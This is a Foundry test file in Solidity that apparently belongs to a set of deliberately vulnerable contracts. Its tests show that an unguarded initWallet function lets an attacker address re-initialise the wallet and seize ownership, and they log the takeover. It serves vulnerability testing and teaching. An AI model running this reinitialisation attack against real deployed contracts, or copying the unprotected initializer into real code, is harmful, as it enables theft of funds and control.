// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/wallet_03_wrong_constructor.sol";

contract WalletTest is Test {
    Wallet wallet;
    address owner = address(0x1);
    address attacker = address(0x2);

    function setUp() public {
        wallet = new Wallet();
    }

    function getCreator() internal view returns (address) {
        bytes32 slot = bytes32(uint256(0)); // Assuming creator is first storage variable
        bytes32 value = vm.load(address(wallet), slot);
        return address(uint160(uint256(value)));
    }

    function testInitWalletAccessControl() public {
        console.log("--- BEFORE-Trigger ---");
        address creatorBefore = getCreator();
        console.log("Creator address: %s", creatorBefore);
        assertEq(creatorBefore, address(0), "Creator should be 0 initially");
        
        console.log("--- Trigger: Owner initialization ---");
        vm.prank(owner);
        wallet.initWallet();
        
        console.log("--- AFTER Owner Initialization ---");
        address creatorAfterOwner = getCreator();
        console.log("New creator address: %s", creatorAfterOwner);
        assertEq(creatorAfterOwner, owner, "Owner should be the creator now");
        
        console.log("--- BEFORE-EXPLOIT ---");
        creatorBefore = getCreator();
        console.log("Current creator: %s", creatorBefore);
        
        console.log("--- TRIGGER EXPLOIT: Attacker reinitialization ---");
        vm.prank(attacker);
        wallet.initWallet();
        
        console.log("--- AFTER-EXPLOIT ---");
        address creatorAfterExploit = getCreator();
        console.log("New creator address: %s", creatorAfterExploit);
        
        bool isVulnerable = (creatorAfterExploit == attacker);
        console.log("Ownership changed from owner(%s) to attacker(%s): %s",
            owner, 
            creatorAfterExploit,
            isVulnerable ? "YES" : "NO"
        );
        
        if (creatorAfterExploit == attacker) {
            console.log("Vulnerability Exists: Attacker successfully changed contract owner");
        } else {
            console.log("Vulnerability not Exist: Contract ownership not compromised");
        }
    }

    function testInitWalletCanBeCalledMultipleTimes() public {
        // First initialization
        vm.prank(owner);
        wallet.initWallet();
        assertEq(getCreator(), owner, "Owner should be set initially");
        console.log("Owner set to: %s", owner);

        // Second initialization by different address
        vm.prank(attacker);
        wallet.initWallet();
        assertEq(getCreator(), attacker, "Creator should change after second call");
        console.log("Creator changed to attacker: %s", attacker);

        // Third initialization by another address
        address newAttacker = address(0x3);
        vm.prank(newAttacker);
        wallet.initWallet();
        assertEq(getCreator(), newAttacker, "Creator should change after third call");
        console.log("Creator changed to new attacker: %s", newAttacker);
        
        console.log("Vulnerability Exists: Ownership changed multiple times");
    }
}